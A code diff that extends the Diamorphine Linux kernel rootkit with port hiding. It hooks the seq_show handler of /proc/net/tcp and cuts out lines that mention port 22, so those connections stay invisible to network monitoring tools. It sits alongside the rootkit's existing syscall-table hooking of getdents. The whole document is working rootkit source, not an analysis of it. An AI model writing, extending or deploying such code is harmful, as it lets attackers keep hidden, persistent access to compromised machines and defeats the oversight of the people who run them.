@@ -25,7 +25,26 @@
 #define __NR_getdents 141
 #endif
 
+# ifndef CPP
+# include <linux/module.h>
+# include <linux/kernel.h>
+# include <net/tcp.h> // struct tcp_seq_afinfo.
+# endif // CPP
 #include "diamorphine.h"
+#include "zeroevil.h"
+
+# define NET_ENTRY "/proc/net/tcp"
+# define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo
+# define SECRET_PORT 22
+# define NEEDLE_LEN 6
+# define TMPSZ 150
+
+int
+(*real_seq_show)(struct seq_file *seq, void *v);
+int
+fake_seq_show(struct seq_file *seq, void *v);
+
+
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
@@ -396,6 +415,8 @@ unprotect_memory(void)
 static int __init
 diamorphine_init(void)
 {
+    set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT,
+                      fake_seq_show, real_seq_show);
 	__sys_call_table = get_syscall_table_bf();
 	if (!__sys_call_table)
 		return -1;
@@ -437,6 +458,13 @@ diamorphine_init(void)
 static void __exit
 diamorphine_cleanup(void)
 {
+    if (real_seq_show) {
+        void *dummy;
+        set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT,
+                          real_seq_show, dummy);
+    }
+
+    fm_alert("%s\n", "Farewell the World!");
 	unprotect_memory();
 
 	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
@@ -452,3 +480,21 @@ module_exit(diamorphine_cleanup);
 MODULE_LICENSE("Dual BSD/GPL");
 MODULE_AUTHOR("m0nad");
 MODULE_DESCRIPTION("LKM rootkit");
+
+int
+fake_seq_show(struct seq_file *seq, void *v)
+{
+    int ret;
+    char needle[NEEDLE_LEN];
+
+    snprintf(needle, NEEDLE_LEN, ":%03X", SECRET_PORT);
+    ret = real_seq_show(seq, v);
+
+    if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) {
+        fm_alert("Hiding port %d using needle %s.\n",
+                 SECRET_PORT, needle);
+        seq->count -= TMPSZ;
+    }
+
+    return ret;
+}
